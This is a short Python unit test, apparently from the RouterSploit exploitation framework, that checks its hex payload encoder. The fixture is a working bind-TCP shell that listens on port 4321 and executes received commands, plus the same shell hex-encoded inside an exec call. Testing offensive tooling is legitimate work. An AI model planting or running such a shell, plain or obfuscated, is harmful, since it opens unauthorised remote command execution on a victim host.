from routersploit.modules.encoders.python.hex import Encoder


# python bind tcp payload with rport=4321
bind_tcp = (
    "import socket,os\n" +
    "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
    "so.bind(('0.0.0.0',4321))\n" +
    "so.listen(1)\n" +
    "so,addr=so.accept()\n" +
    "x=False\n" +
    "while not x:\n" +
    "\tdata=so.recv(1024)\n" +
    "\tstdin,stdout,stderr,=os.popen3(data)\n" +
    "\tstdout_value=stdout.read()+stderr.read()\n" +
    "\tso.send(stdout_value)\n"
)

# python bind tcp payload with rport=4321 encoded with python/hex
bind_tcp_encoded = (
    "exec('696d706f727420736f636b65742c6f730a736f3d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a736f2e62696e64282827302e302e302e30272c3433323129290a736f2e6c697374656e2831290a736f2c616464723d736f2e61636365707428290a783d46616c73650a7768696c65206e6f7420783a0a09646174613d736f2e726563762831303234290a09737464696e2c7374646f75742c7374646572722c3d6f732e706f70656e332864617461290a097374646f75745f76616c75653d7374646f75742e7265616428292b7374646572722e7265616428290a09736f2e73656e64287374646f75745f76616c7565290a'.decode('hex'))"
)


def test_payload_enconding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
